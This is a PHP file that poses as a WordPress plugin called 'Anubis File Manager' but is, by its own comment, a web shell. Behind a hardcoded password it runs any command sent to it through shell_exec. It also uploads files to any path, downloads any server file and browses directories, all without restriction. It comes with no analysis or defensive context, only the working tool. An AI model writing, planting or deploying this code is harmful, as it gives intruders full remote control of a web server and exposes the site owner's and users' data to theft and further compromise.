<?php
/*
Plugin Name: Anubis File Manager
Plugin URI: https://github.com/anubis
Description: Advanced file management system with security features
Version: 1.0.0
Author: Root Team
Author URI: https://github.com/anubis
License: GPL v2 or later
Text Domain: anubis
*/

// ANUBIS ROOT WebShell
session_start();

// Düz metin şifre kontrolü (test amaçlı)
$password = '440044';

if (!isset($_SESSION['auth'])) {
    if (isset($_POST['pass'])) {
        if ($_POST['pass'] === $password) {
            $_SESSION['auth'] = true;
        } else {
            $error = "Yanlış şifre!";
        }
    }
    
    if (!isset($_SESSION['auth'])) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>ANUBIS ROOT - Login</title>
            <style>
                body { font-family: Arial; background: #1a1a1a; color: #fff; text-align: center; padding: 50px; }
                .login-box { background: #2a2a2a; padding: 30px; border-radius: 10px; display: inline-block; }
                input[type="password"] { padding: 10px; margin: 10px; border: none; border-radius: 5px; }
                input[type="submit"] { padding: 10px 20px; background: #007cba; color: white; border: none; border-radius: 5px; cursor: pointer; }
                .error { color: #ff4444; margin: 10px 0; }
            </style>
        </head>
        <body>
            <div class="login-box">
                <h2>ANUBIS ROOT</h2>
                <form method="post">
                    <input type="password" name="pass" placeholder="Şifre" required>
                    <br>
                    <input type="submit" value="Giriş">
                </form>
                <?php if (isset($error)) echo "<div class='error'>$error</div>"; ?>
            </div>
        </body>
        </html>
        <?php
        exit;
    }
}

// Ana sayfa
if (isset($_GET['action'])) {
    $action = $_GET['action'];
    
    switch ($action) {
        case 'cmd':
            if (isset($_POST['cmd'])) {
                echo "<pre>";
                echo htmlspecialchars(shell_exec($_POST['cmd']));
                echo "</pre>";
            }
            break;
            
        case 'upload':
            if (isset($_FILES['file'])) {
                $uploadDir = $_POST['path'] ?? '.';
                $targetFile = $uploadDir . '/' . $_FILES['file']['name'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
                    echo "Dosya yüklendi: " . htmlspecialchars($targetFile);
                } else {
                    echo "Yükleme başarısız!";
                }
            }
            break;
            
        case 'download':
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                if (file_exists($file)) {
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    readfile($file);
                    exit;
                }
            }
            break;
    }
}

// Dosya yöneticisi
$currentDir = $_GET['dir'] ?? '.';
$files = scandir($currentDir);
?>
<!DOCTYPE html>
<html>
<head>
    <title>ANUBIS ROOT - File Manager</title>
    <style>
        body { font-family: Arial; background: #1a1a1a; color: #fff; margin: 0; padding: 20px; }
        .header { background: #2a2a2a; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .nav { background: #333; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        .nav a { color: #007cba; text-decoration: none; margin-right: 15px; }
        .file-list { background: #2a2a2a; padding: 20px; border-radius: 10px; }
        .file-item { padding: 10px; border-bottom: 1px solid #444; display: flex; justify-content: space-between; }
        .file-item:hover { background: #333; }
        .cmd-box { background: #2a2a2a; padding: 20px; border-radius: 10px; margin-top: 20px; }
        input, textarea { background: #444; color: #fff; border: 1px solid #666; padding: 8px; border-radius: 3px; }
        button { background: #007cba; color: white; border: none; padding: 8px 15px; border-radius: 3px; cursor: pointer; }
        .logout { float: right; }
    </style>
</head>
<body>
    <div class="header">
        <h1>ANUBIS ROOT - File Manager</h1>
        <div class="logout">
            <a href="?logout=1" style="color: #ff4444;">Çıkış</a>
        </div>
    </div>
    
    <div class="nav">
        <a href="?">Ana Sayfa</a>
        <a href="?action=cmd">Terminal</a>
        <a href="?action=upload">Dosya Yükle</a>
        <strong>Mevcut Dizin: <?php echo htmlspecialchars($currentDir); ?></strong>
    </div>
    
    <div class="file-list">
        <h3>Dosyalar ve Klasörler:</h3>
        <?php foreach ($files as $file): ?>
            <?php if ($file != '.'): ?>
                <div class="file-item">
                    <span>
                        <?php if (is_dir($currentDir . '/' . $file)): ?>
                            📁 <a href="?dir=<?php echo urlencode($currentDir . '/' . $file); ?>"><?php echo htmlspecialchars($file); ?></a>
                        <?php else: ?>
                            📄 <?php echo htmlspecialchars($file); ?>
                            <a href="?action=download&file=<?php echo urlencode($currentDir . '/' . $file); ?>" style="color: #007cba;">[İndir]</a>
                        <?php endif; ?>
                    </span>
                    <span>
                        <?php if (is_file($currentDir . '/' . $file)): ?>
                            <?php echo number_format(filesize($currentDir . '/' . $file)); ?> bytes
                        <?php endif; ?>
                    </span>
                </div>
            <?php endif; ?>
        <?php endforeach; ?>
    </div>
    
    <div class="cmd-box">
        <h3>Terminal Komutu:</h3>
        <form method="post" action="?action=cmd">
            <input type="text" name="cmd" placeholder="Komut girin..." style="width: 70%;">
            <button type="submit">Çalıştır</button>
        </form>
    </div>
    
    <div class="cmd-box">
        <h3>Dosya Yükle:</h3>
        <form method="post" action="?action=upload" enctype="multipart/form-data">
            <input type="hidden" name="path" value="<?php echo htmlspecialchars($currentDir); ?>">
            <input type="file" name="file" required>
            <button type="submit">Yükle</button>
        </form>
    </div>
</body>
</html>

<?php
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}
?>
